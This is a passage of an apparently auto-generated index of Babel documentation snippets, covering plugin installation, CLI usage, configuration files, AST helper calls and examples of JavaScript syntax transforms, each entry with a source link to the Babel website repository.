@babel/plugin-transform-object-assign package as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-assign.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-object-assign\n```\n\n----------------------------------------\n\nTITLE: Checking for Private Class Elements in JavaScript\nDESCRIPTION: This code snippet demonstrates how to use `t.isPrivate(node)` to determine if a given AST node represents a private class element or private identifier. It checks for `ClassPrivateMethod`, `ClassPrivateProperty`, and `PrivateName` nodes.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_288\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isPrivate(node);\n```\n\n----------------------------------------\n\nTITLE: Transformed typeof Symbol Example - JavaScript\nDESCRIPTION: This code shows the output of the transform. The original `typeof` expression is replaced with a helper function that checks the constructor of the object to determine if it is a Symbol.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typeof-symbol.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar _typeof = function(obj) {\n  return obj && obj.constructor === Symbol ? \"symbol\" : typeof obj;\n};\n\n_typeof(Symbol()) === \"symbol\";\n```\n\n----------------------------------------\n\nTITLE: Class Properties and Private Methods JavaScript\nDESCRIPTION: This snippet showcases the use of public and private class fields and private methods, which have been added to the `shippedProposals` option of `@babel/preset-env`. This allows developers to use these features without explicitly specifying the corresponding plugins.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-05-25-7.10.0.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Bork {\n  // Public Fields\n  instanceProperty = \"bork\";\n  static staticProperty = \"babelIsCool\";\n  // Private Fields\n  #xValue = 0;\n  a() {\n    this.#xValue++;\n  }\n\n  // Private methods\n  get #x() { return this.#xValue; }\n  set #x(value) {\n    this.#xValue = value;\n  }\n  #clicked() {\n    this.#x++;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin in babel.config.json\nDESCRIPTION: Example of how to configure the `@babel/plugin-proposal-export-default-from` plugin in a `babel.config.json` file. This configuration enables the plugin for all Babel transformations.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-export-default-from.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-proposal-export-default-from\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Plugin - JSON\nDESCRIPTION: This JSON snippet shows how to configure the plugin within a babel.config.json file. Adding the plugin to the 'plugins' array enables the parsing of explicit resource management syntax during Babel's transformation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-explicit-resource-management.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-explicit-resource-management\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Transform Object.setPrototypeOf (Output)\nDESCRIPTION: This JavaScript code snippet demonstrates the output code after the Babel plugin has transformed the input. It uses the '_defaults' helper function to achieve the same effect as Object.setPrototypeOf.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-set-prototype-of-to-assign.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar _defaults = ...;\n\n_defaults(bar, foo);\n```\n\n----------------------------------------\n\nTITLE: Migrate getModuleName in Babel Plugin (diff)\nDESCRIPTION: This code shows the migration from `pass.getModuleName()` to `pass.file.getModuleName()` within a Babel plugin visitor. It highlights the change needed to access the module name after the API update.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_78\n\nLANGUAGE: diff\nCODE:\n```\nmodule.exports = {\n  name: \"my-babel-plugin\",\n  visitor: {\n    Identifier(path, pass) {\n-     const moduleName = pass.getModuleName();\n+     const moduleName = pass.file.getModuleName();\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Preset Configuration with `env` Option - JavaScript\nDESCRIPTION: This code demonstrates how to configure Babel presets using the `env` option in `.babelrc` to define environment-specific configurations. It showcases how plugins and presets merge based on their identity, allowing for more granular control over transformations in different environments (e.g., testing).\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-12-27-nearing-the-7.0-release.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  presets: [\n    ['env', { modules: false}],\n  ],\n  env: {\n    test: {\n      presets: [\n         'env'\n      ],\n    }\n  },\n}\n```\n\n----------------------------------------\n\nTITLE: Configure plugin with options\nDESCRIPTION: This shows how to configure the plugin with options (loose and assumeArray) in your babel configuration file. 'loose' enables a fast path for arrays, heavily increasing performance. 'assumeArray' assumes all loops are arrays.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-for-of.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"plugins\": [\n    [\"@babel/plugin-transform-for-of\", {\n      \"loose\": true, // defaults to false\n      \"assumeArray\": true // defaults to false\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Unicode Regex Example Input JavaScript\nDESCRIPTION: This JavaScript code demonstrates a regular expression match using the /u flag to handle Unicode characters. The variable 'string' contains a string with a Unicode character, and 'match' attempts to capture a portion of the string based on the provided regex.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-regex.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar string = \"foo💩bar\";\nvar match = string.match(/foo(.)bar/u);\n```\n\n----------------------------------------\n\nTITLE: Running Babel Plugin via CLI\nDESCRIPTION: Runs Babel from the command line, specifying the @babel/plugin-syntax-export-default-from plugin to be used during the transformation.  The script.js file is the input file to be processed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-export-default-from.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-export-default-from script.js\n```\n\n----------------------------------------\n\nTITLE: Installing babel-plugin-transform-remove-debugger\nDESCRIPTION: Installs the 'babel-plugin-transform-remove-debugger' plugin using npm. The '--save-dev' flag ensures it's saved as a development dependency.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-remove-debugger.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-plugin-transform-remove-debugger --save-dev\n```\n\n----------------------------------------\n\nTITLE: ES6 React Component Creation\nDESCRIPTION: Demonstrates the more concise syntax for creating React components using ES6 classes.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-07-07-react-on-es6-plus.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n// The ES6+ way\nclass Photo extends React.Component {\n  handleDoubleTap(e) { … }\n  render() { … }\n}\n```\n\n----------------------------------------\n\nTITLE: Using data-type attribute for ES Modules\nDESCRIPTION: This snippet demonstrates using the data-type attribute to enable support for ES Modules within @babel/standalone. Setting data-type to module allows you to use import and export statements in your code.\nSOURCE: https://github.com/babel/website/blob/main/docs/standalone.md#_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<script type=\"text/babel\" data-type=\"module\">\n\n```\n\n----------------------------------------\n\nTITLE: Transform with CLI\nDESCRIPTION: This command demonstrates how to use the Babel CLI to transform a JavaScript file using the @babel/plugin-transform-computed-properties plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-computed-properties.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-computed-properties script.js\n```\n\n----------------------------------------\n\nTITLE: Async Do Expression Example JavaScript\nDESCRIPTION: This example demonstrates the usage of `async do` expressions to issue HTTP requests in parallel using `Promise.all` and `fetch`. The `async do` blocks fetch data from two different URLs and await the JSON results.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-async-do-expressions.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nPromise.all([\n  async do {\n    const result = await fetch('https://example.com/A');\n    await result.json()\n  },\n  async do {\n    const result = await fetch('https://example.org/B');\n    await result.json()\n  },\n]).then(([a, b]) => {\n  console.log(\"example.com/A\", a);\n  console.log(\"example.org/B\", b);\n})\n```\n\n----------------------------------------\n\nTITLE: Get Function Arity JavaScript\nDESCRIPTION: This code snippet demonstrates how to import and use the `getFunctionArity` helper function from the `@babel/helper-get-function-arity` package. It shows its application within a `wrap` function to determine the number of arguments expected by a method.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-get-function-arity.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport getFunctionArity from \"@babel/helper-get-function-arity\";\n\nfunction wrap(state, method, id, scope) {\n  // ...\n  if (!t.isFunction(method)) {\n    return false;\n  }\n\n  const argumentsLength = getFunctionArity(method);\n\n  // ...\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring @babel/plugin-syntax-bigint\nDESCRIPTION: Configures Babel to use the @babel/plugin-syntax-bigint plugin by adding it to the plugins array in the babel.config.json file. This enables Babel to parse BigInt syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-bigint.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-bigint\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Run Babel via CLI\nDESCRIPTION: Demonstrates how to use the Babel CLI to transform a JavaScript file using the @babel/plugin-transform-react-display-name plugin. The `--plugins` flag specifies which plugins to use during the transformation.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-display-name.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-react-display-name script.js\n```\n\n----------------------------------------\n\nTITLE: Configure Plugin - No Options\nDESCRIPTION: This JSON configuration demonstrates how to enable the @babel/plugin-transform-computed-properties plugin in a babel.config.json file without any additional options.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-computed-properties.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-computed-properties\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Using Optional Chaining Assign Plugin via CLI\nDESCRIPTION: Shows how to use the Babel CLI to transform a JavaScript file using the @babel/plugin-syntax-optional-chaining-assign plugin.  This enables parsing the optional chaining assignment syntax during the transformation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-optional-chaining-assign.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-optional-chaining-assign script.js\n```\n\n----------------------------------------\n\nTITLE: JSON Module Import Compiled (JavaScript)\nDESCRIPTION: This is the compiled output of the JSON module import when targeting CommonJS on Node.js using `@babel/plugin-proposal-json-modules` without the `uncheckedRequire` option.  It uses `JSON.parse` and `readFileSync` to ensure the imported file is a valid JSON file. Requires Node.js environment.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2024-07-26-7.25.0.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst myConfig = JSON.parse(\n  require(\"fs\").readFileSync(require.resolve(\"./config.json\"))\n);\n```\n\n----------------------------------------\n\nTITLE: Optimize for-of Loop for Arrays (Input)\nDESCRIPTION: This JavaScript code shows a for-of loop iterating over an array literal. When the `assumeArray` option is enabled, Babel can optimize this into a regular for loop.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-for-of.md#_snippet_10\n\nLANGUAGE: javascript\nCODE:\n```\nfor (let a of [1, 2, 3]) {\n}\n```\n\n----------------------------------------\n\nTITLE: Add Namespace Import JavaScript\nDESCRIPTION: Adds a namespace import statement. Requires @babel/helper-module-imports. This imports all exports from a module into a namespace object.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-module-imports.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { addNamespace } from \"@babel/helper-module-imports\";\naddNamespace(path, 'source');\n```\n\n----------------------------------------\n\nTITLE: Install @babel/plugin-syntax-module-string-names\nDESCRIPTION: This command installs the @babel/plugin-syntax-module-string-names plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-module-string-names.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-module-string-names\n```\n\n----------------------------------------\n\nTITLE: Use Plugin via CLI (Shell)\nDESCRIPTION: Command to use the @babel/plugin-transform-object-super plugin via the Babel CLI. This command transforms the specified script.js file using the plugin. The `babel` CLI must be installed globally or locally in your project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-super.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-object-super script.js\n```\n\n----------------------------------------\n\nTITLE: Using @babel/plugin-syntax-flow via CLI\nDESCRIPTION: Demonstrates how to use the @babel/plugin-syntax-flow plugin via the Babel CLI. The --plugins flag specifies the plugin to use when processing the input file (script.js).\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-flow.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-flow script.js\n```\n\n----------------------------------------\n\nTITLE: Including Twitter Widgets Script\nDESCRIPTION: This script includes the Twitter widgets library for rendering Twitter-related content on the page. It loads asynchronously to avoid blocking the page rendering. The charset is set to utf-8 to support various character sets.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-08-27-7.0.0.md#_snippet_21\n\nLANGUAGE: HTML\nCODE:\n```\n<script async src=\"https://platform.twitter.com/widgets.js\" charset=\"utf-8\"></script>\n```\n\n----------------------------------------\n\nTITLE: Creating Babel Configuration File (babel.config.json)\nDESCRIPTION: This code snippet shows how to create a `babel.config.json` file in the project root to specify Babel presets. The `@babel/preset-env` preset is used to enable support for the latest JavaScript syntax. This allows Babel to transpile modern JavaScript code for compatibility during testing.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/jasmine/usage.md#_snippet_1\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\"@babel/preset-env\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Instance Private Methods in Babel\nDESCRIPTION: This snippet shows the use of instance private methods, indicated by the `#` prefix. These methods can only be called from within the class instance. Babel transforms this syntax to ensure proper encapsulation.\nSOURCE: https://github.com/babel/website/blob/main/docs/features-timeline.md#_snippet_13\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Dog {\n  #bark() { console.log(\"Mew!\") }\n}\n```\n\n----------------------------------------\n\nTITLE: Generator Function Input Example (JavaScript)\nDESCRIPTION: This is an example of a generator function. It uses the `function*` syntax and the `yield` keyword, which are features introduced in ES6.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-regenerator.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction* a() {\n  yield 1;\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: Utilizes the Babel Node API to transform JavaScript code, including the `@babel/plugin-syntax-class-properties` plugin. This enables parsing of class properties syntax during the transformation process. Requires `@babel/core`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-class-properties.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-class-properties\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Property Signature\nDESCRIPTION: Creates a TypeScript property signature node in the AST. Used within interfaces or type literals to define the signature of a property. Requires the property's key, and accepts an optional type annotation. The `computed`, `kind`, `optional` and `readonly` properties are excluded from the builder function.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_201\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsPropertySignature(key, typeAnnotation);\n```\n\n----------------------------------------\n\nTITLE: Math, Number, String, Object APIs JavaScript\nDESCRIPTION: This code showcases various new APIs added to the Math, Number, String, and Object objects in ES2015. It includes examples of `Number.EPSILON`, `Number.isInteger`, `Math.acosh`, `String.prototype.includes`, `Array.from`, `Object.assign`, and more. Most APIs are supported by the Babel polyfill.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_29\n\nLANGUAGE: JavaScript\nCODE:\n```\nNumber.EPSILON\nNumber.isInteger(Infinity) // false\nNumber.isNaN(\"NaN\") // false\n\nMath.acosh(3) // 1.762747174039086\nMath.hypot(3, 4) // 5\nMath.imul(Math.pow(2, 32) - 1, Math.pow(2, 32) - 2) // 2\n\n\"abcde\".includes(\"cd\") // true\n\"abc\".repeat(3) // \"abcabcabc\"\n\nArray.from(document.querySelectorAll(\"*\")) // Returns a real Array\nArray.of(1, 2, 3) // Similar to new Array(...), but without special one-arg behavior\n[0, 0, 0].fill(7, 1) // [0,7,7]\n[1,2,3].findIndex(x => x == 2) // 1\n[\"a\", \"b\", \"c\"].entries() // iterator [0, \"a\"], [1,\"b\"], [2,\"c\"]\n[\"a\", \"b\", \"c\"].keys() // iterator 0, 1, 2\n[\"a\", \"b\", \"c\"].values() // iterator \"a\", \"b\", \"c\"\n\nObject.assign(Point, { origin: new Point(0,0) })\n```\n\n----------------------------------------\n\nTITLE: Object Rest Spread Transformation (JavaScript)\nDESCRIPTION: This snippet demonstrates how the `object-rest-spread` plugin transforms object destructuring with rest properties. It shows the input JavaScript code and the corresponding output after the transformation, using the `_objectWithoutProperties` helper function.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-11-16-6.19.0.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst { a, ...b } = c;\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst { a } = c; // remove the `...b`\nconst b = _objectWithoutProperties(c, [\"a\"]); // use the helper\n```\n\n----------------------------------------\n\nTITLE: Creating TSTemplateLiteralType for interpolated template literal types (TS)\nDESCRIPTION: This snippet demonstrates the creation of the `TSTemplateLiteralType` node in Babel 8 when parsing template literal types with interpolated values. In Babel 7, these were represented as `TemplateLiteral` nodes within a `TSLiteralType`.  If there is no interpolated position, e.g. `` `foo` ``, then template literal type is still parsed as a TemplateLiteral node within a TSLiteralType.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_47\n\nLANGUAGE: typescript\nCODE:\n```\ntype World = \"world\";\n// `hello ${World}` is a template literal type\ntype Greeting = `hello ${World}`;\n\n// AST in Babel 7\n{\n  type: \"TSLiteralType\",\n  literal: {\n    type: \"TemplateLiteral\",\n    expressions: [{\n      type: \"TSTypeReference\",\n      typeName: Identifier(\"World\")\n    }],\n    quasis: [\n      TemplateElement(\"hello \"),\n      TemplateElement(\"\")\n    ]\n  }\n}\n\n// AST in Babel 8\n{\n  type: \"TSTemplateLiteralType\",\n  types: [{\n    type: \"TSTypeReference\",\n    typeName: Identifier(\"World\")\n  }],\n  quasis: [\n    TemplateElement(\"hello \"),\n    TemplateElement(\"\")\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Static Private Fields Support in Babel\nDESCRIPTION: This snippet showcases static private fields, which are class fields only accessible within the class itself. They are denoted by the `#` prefix. Babel transformation is required to implement the privacy.\nSOURCE: https://github.com/babel/website/blob/main/docs/features-timeline.md#_snippet_15\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Person {\n  static #classId = 3;\n}\n```\n\n----------------------------------------\n\nTITLE: Using @babel/preset-stage-0 via CLI\nDESCRIPTION: Transforms a JavaScript file using the @babel/preset-stage-0 preset through the Babel CLI. Requires the @babel/cli package to be installed.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-stage-0.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nbabel script.js --presets @babel/preset-stage-0\n```\n\n----------------------------------------\n\nTITLE: Creating a TSConstructorType Node in JavaScript\nDESCRIPTION: This code snippet shows how to create a `TSConstructorType` AST node using the `t.tsConstructorType` builder function.  It accepts type parameters, parameters, and a type annotation. The resulting node represents a constructor type in TypeScript.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_166\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsConstructorType(typeParameters, parameters, typeAnnotation);\n```\n\n----------------------------------------\n\nTITLE: Using TransformBabel Task in MSBuild\nDESCRIPTION: This XML snippet utilizes the TransformBabel task to transform JavaScript and JSX files within a specified directory. SourceDir attribute specifies the directory containing the source files, while TargetDir (left blank here) defines the output directory. If TargetDir is empty, output files are placed next to the source files with the `.generated.js` extension.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/msbuild/usage.md#_snippet_1\n\nLANGUAGE: xml\nCODE:\n```\n<TransformBabel SourceDir=\"$(MSBuildProjectDirectory)\" TargetDir=\"\" />\n```\n\n----------------------------------------\n\nTITLE: Checking for Statements in JavaScript\nDESCRIPTION: This snippet uses `t.isStatement(node)` to check if an AST node represents a statement.  It covers various statement types, including declarations, loops, and control flow.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_293\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isStatement(node);\n```\n\n----------------------------------------\n\nTITLE: Transform Code via Node API\nDESCRIPTION: This JavaScript code snippet demonstrates how to use the Babel Node API to transform JavaScript code using the `@babel/plugin-transform-export-namespace-from` plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-export-namespace-from.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-export-namespace-from\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Transformed __proto__ Assignment\nDESCRIPTION: Shows how the plugin transforms the __proto__ assignment into a function call. Demonstrates the input and output transformation of the code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-proto-to-assign.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nbar.__proto__ = foo;\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Namespace Export Declaration\nDESCRIPTION: Creates a TypeScript namespace export declaration node in the AST. Represents a `namespace` export. Requires an identifier (`id`) representing the namespace being exported.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_192\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsNamespaceExportDeclaration(id);\n```\n\n----------------------------------------\n\nTITLE: Creating a TSTypeAnnotation Node in JavaScript\nDESCRIPTION: This snippet shows how to create a `TSTypeAnnotation` AST node using Babel's `t.tsTypeAnnotation` method. It requires a `TSType` type annotation as an argument.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_211\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsTypeAnnotation(typeAnnotation);\n```\n\n----------------------------------------\n\nTITLE: Babelrc Configuration JSON Example\nDESCRIPTION: Illustrates the usage of `.babelrc` for configuring Babel. It showcases how to define options such as `stage` and `ignore` within a JSON file to customize Babel's behavior.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-03-31-5.0.0.md#_snippet_15\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"stage\": 1,\n  \"ignore\": [\n    \"foo.js\",\n    \"bar/**/*.js\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via npm\nDESCRIPTION: Installs the `@babel/plugin-proposal-throw-expressions` Babel plugin as a development dependency using npm. This allows developers to use throw expressions in their JavaScript code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-throw-expressions.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-proposal-throw-expressions\n```\n\n----------------------------------------\n\nTITLE: Checking for Scopes in JavaScript\nDESCRIPTION: This snippet uses `t.isScopable(node)` to check if an AST node introduces a new scope. It encompasses function-related nodes, block statements, and loop constructs.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_291\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isScopable(node);\n```\n\n----------------------------------------\n\nTITLE: Using the Babel CLI with the plugin\nDESCRIPTION: This shell command demonstrates how to use the Babel CLI to transform a JavaScript file (`script.js`) using the `@babel/plugin-transform-property-literals` plugin.  It requires babel to be installed globally or locally in the project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-property-literals.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-property-literals script.js\n```\n\n----------------------------------------\n\nTITLE: Webpack Configuration for Acorn-Stage3 plugin\nDESCRIPTION: This JavaScript snippet shows how to enable the `acorn-stage3` plugin in a Webpack configuration file for older Webpack versions (prior to v5.36.0). This workaround is necessary to support class fields syntax natively in Webpack.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-04-29-7.14.0.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Require webpack's acorn dependency\nconst acorn = require(require.resolve(\"acorn\", {\n  paths: [require.resolve(\"webpack\")]\n}));\n\n// Enable the Stage 3 plugin\nacorn.Parser = acorn.Parser.extend(require(\"acorn-stage3\"));\n```\n\n----------------------------------------\n\nTITLE: Third Revision of replace-top-level-this-plugin (JS)\nDESCRIPTION: This version refactors the plugin to use the `FunctionParent` alias, making it more maintainable. It checks if the parent function is an arrow function before skipping traversal, ensuring that `this` expressions within non-arrow functions are not replaced.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-environment-visitor.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nmodule.exports = (api) => {\n  const { types: t } = api;\n  return {\n    name: \"replace-top-level-this\",\n    visitor: {\n      ThisExpression(path) {\n        path.replaceWith(t.identifier(\"globalThis\"));\n      }\n      FunctionParent(path) {\n        if (!path.isArrowFunctionExpression()) {\n          path.skip();\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Optional Catch Binding - JavaScript\nDESCRIPTION: This code snippet demonstrates the optional catch binding feature, which allows developers to use try/catch blocks without specifying a catch variable if it's not needed.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\ntry {\n  throw 0;\n} catch {\n  doSomethingWhichDoesNotCareAboutTheValueThrown();\n}\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\ntry {\n  throw 0;\n} catch (_unused) {\n  doSomethingWhichDoesNotCareAboutTheValueThrown();\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel with Babili Preset\nDESCRIPTION: This snippet shows how to configure Babel to use the `babili` preset in the `production` environment. This is done using the `env` option in the `.babelrc` file.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-08-26-babili.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\n// previous .babelrc\n{ \"presets\": [\"es2015\"] }\n// .babelrc\n{\n  \"presets\": [\"es2015\"],\n  \"env\": {\n    \"production\": {\n      \"presets\": [\"babili\"]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Checking for While Nodes in JavaScript\nDESCRIPTION: This snippet demonstrates how to check if an AST node represents a `DoWhileStatement` or a `WhileStatement` using Babel's `t.isWhile` method. These two statements share the same AST shape, allowing for simplified processing. This method is useful for identifying looping constructs when the specific type of loop (do-while vs. while) is not relevant to the transformation being performed.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_302\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isWhile(node);\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel for Optimized JSX with Object Spread\nDESCRIPTION: This JSON configuration shows how to enable the `useSpread` option in `@babel/react` preset to utilize native object spread in JSX transformations. Setting `useSpread` to `true` allows Babel to generate more optimized code for JSX elements with spread attributes. Requires `@babel/preset-react` to be installed.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-11-05-7.7.0.md#_snippet_9\n\nLANGUAGE: jsonld\nCODE:\n```\n{\n  presets: [\n    [\"@babel/react\", { useSpread: true }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Checking for UserWhitespacable Nodes in JavaScript\nDESCRIPTION: This snippet demonstrates how to check if an AST node is a 'UserWhitespacable' node using Babel's `t.isUserWhitespacable` method. Note that this functionality is deprecated and will be removed in Babel 8. Covered nodes include `ObjectMethod`, `ObjectProperty`, `ObjectTypeCallProperty`, `ObjectTypeIndexer`, `ObjectTypeInternalSlot`, `ObjectTypeProperty`, and `ObjectTypeSpreadProperty`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_301\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isUserWhitespacable(node);\n```\n\n----------------------------------------\n\nTITLE: Preset React ES Modules Target Configuration - JSON\nDESCRIPTION: This code snippet shows how to configure the `browsers` target in `@babel/preset-env` to preserve the Babel 7 `esmodules: true` behavior. It is used when your app targets browsers released before 2019 and you want to retain the original ES modules handling.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration.md#_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n[\n  \"@babel/preset-env\",\n  {\n    \"targets\": {\n      \"browsers\": \"chrome 61, firefox 60, safari 10.1, node 13.2\"\n    }\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Configuring Recast for Code Modification with Babel\nDESCRIPTION: This configuration snippet shows how to configure Babel to use Recast for parsing and generating code, which preserves the original formatting of the code during transformations. This can be used to perform codemods while maintaining the style of the original code.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-12-07-the-state-of-babel.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"parserOpts\": {\n    \"parser\": \"recast\"\n  },\n  \"generatorOpts\": {\n    \"generator\": \"recast\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin (babel.config.json)\nDESCRIPTION: Configuration example for using the plugin within a `babel.config.json` file.  This is the recommended approach for integrating the plugin into a Babel build process.\nSOURCE: 